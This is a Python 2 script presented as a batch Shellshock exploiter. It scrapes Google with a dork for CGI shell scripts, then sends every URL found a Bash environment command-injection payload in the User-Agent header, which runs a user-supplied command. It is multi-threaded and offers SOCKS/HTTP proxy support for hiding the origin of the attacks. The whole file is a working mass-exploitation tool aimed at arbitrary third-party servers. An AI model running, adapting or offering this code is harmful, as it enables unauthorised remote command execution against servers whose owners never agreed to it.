import urllib2, requests, socket, urlparse
import Queue, threading, re
import random, sys, argparse, time


class Exploit(threading.Thread):
	def __init__(self, google, cmd):
		self.targets = google.targets
		self.google = google
		self.cmd = cmd
		threading.Thread.__init__(self)

	def run(self):
		while not self.google.dead:
			while not self.targets.empty(): 
				url = self.targets.get()
				try:
					headers = {"User-Agent":"() { :; }; " + self.cmd}
					r = requests.get(url, headers = headers, verify = False)
					print str(r.status_code) + " : " + url
				except Exception as e:
					print str(e) + url
				finally:
					self.targets.task_done()
			time.sleep(0.1)

class Google(threading.Thread):
	def __init__(self, dork, count):
		self.dork = dork
		self.count = count
		self.targets = Queue.Queue()
		self.launch = False
		self.dead = False
		threading.Thread.__init__(self)

	def run(self):
		try:
			for i in range(0, self.count):
				self.google(dork, i)
				if not self.targets.empty():
					self.launch = True
				else:
					self.launch = False
				time.sleep(random.random()*3)
		except Exception as e:
			print "Cant Connect to Google!"
		finally:
			self.launch = True
			self.dead = True			
		print "Google Search Done"

	def google(self, dork, index):
		url = 'https://www.google.com/search?q='+urllib2.quote(dork)+'&_'+str(random.random())+'&start='+str(index);
		
		#userAgent = 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36';
		#headers = {"User-Agent":userAgent}

		r = requests.get(url, timeout=10)
		if r.status_code == 503:
			print "Blocked by Google!"

		p = re.compile("/url\\?q=(.*?)&")
		result = re.findall(p,r.content)

		for link in result:
			if "googleusercontent" not in link:
				#print link
				self.targets.put(link)



USAGE = "exp -t thread -c page_count -e command"
DESC  = "Batch Exploit GNU Bash Env Command Injection base on Google. Version 1.1 \n code by kingx  -   http://cih.so"
epilog = "License, requests, etc: https://github.com/KxCode"
parser = argparse.ArgumentParser(usage=USAGE, description=DESC, epilog=epilog)
parser.add_argument('-t', dest='thread_count',
					type=int,
                    help="thread count",
                    default=4)
parser.add_argument('-c', dest='page_count',
					type=int,
                    help="crawl google page count",
                    default=1)
parser.add_argument('-d', dest='dork',
                    help="Custom Google Dork",
                    default="filetype:sh inurl:cgi")
parser.add_argument('-e', dest='cmd',
                    help="Command to Execute",
                    default="whoami")
parser.add_argument('-p', dest='proxy',
                    help="proxy,support:socks4,socks5,http eg: socks5://127.0.0.1:1234 ")
args = parser.parse_args()


#PROXY CODE START
if args.proxy:
	try:
		proxy = urlparse.urlparse(args.proxy)
		(scheme,host,port) = (proxy.scheme,proxy.hostname,proxy.port)
		print "[ PROXY ]\t"+ scheme + "://" + host + ":" + str(port)
		try:
			import socks
		except ImportError:
		    print("For Proxy Support, Please Download socks.py From Sockipy Project.")
		    sys.exit(1)
		if proxy.scheme == "socks5":
			proxy_type = socks.PROXY_TYPE_SOCKS5
		elif proxy.scheme == "socks4":
			proxy_type = socks.PROXY_TYPE_SOCKS4
		elif proxy.scheme == "http":
			proxy_type = socks.PROXY_TYPE_HTTP
		else:
			print "Unsupported proxy type!"
			sys.exit(1)
		socks.setdefaultproxy(proxy_type, host, port)
		socket.socket = socks.socksocket
	except Exception as e:
		print e
#PROXY CODE END

dork = args.dork
print "[ DORK ]\t"+dork
print "[ THREAD ]\t"+str(args.thread_count)
print "[ PAGE ]\t"+str(args.page_count)

google = Google(dork, args.page_count)
print "Google Searching..."
google.start()


while not google.launch:
	time.sleep(0.1)

pool = []
for i in range(0,args.thread_count):
	exp = Exploit(google, args.cmd)
	pool.append(exp)
	exp.daemon = True
	exp.start()

for th in pool:
	th.join()

print "done"
